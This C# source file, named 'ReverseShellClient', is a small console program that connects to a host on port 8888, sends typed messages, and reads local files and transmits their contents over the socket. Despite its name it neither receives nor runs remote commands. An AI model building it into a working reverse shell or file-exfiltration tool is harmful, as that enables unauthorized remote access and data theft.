using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace ReverseShellClient
{
    class Program
    {
        private static TcpClient socket = new TcpClient();

        private const int port = 8888;

        static void Main(string[] args)
        {
            while (true)
            {
                string inp = Console.ReadLine();

                ExecuteCommand(inp);
            }
        }

        public static void ExecuteCommand(string fullCommand)
        {
            if (fullCommand.StartsWith("!rsc "))
            {
                string command = fullCommand.Substring(5).Split('!')[0];
                List<string> args = fullCommand.Substring(5).Split('!').Except(new string[] { command }).ToList();

                switch (command)
                {
                    case "save_to_file":

                        File.WriteAllText(args[0], args[1].Substring(1));

                        SendMessage("File saved.");

                        break;

                    case "send_file":

                        SendMessage("!rs save_to_file !f " + File.ReadAllText(args[0]));

                        break;

                    case "stop":

                        Environment.Exit(0);

                        break;

                    case "connect":

                        socket.Connect(args[0], port);

                        break;

                    case "disconnect":

                        socket.Close();

                        break;

                    default:

                        SendMessage("Unknown command");

                        break;
                }
            }
            else
            {
                SendMessage(fullCommand);
            }
        }

        public static void SendMessage(string message)
        {
            if (!socket.Connected)
            {
                Console.WriteLine("Not connected.");
                return;
            }

            var stream = socket.GetStream();

            byte[] bytes = Encoding.ASCII.GetBytes(message);

            stream.Write(bytes, 0, bytes.Length);
            stream.Flush();
        }
    }
}
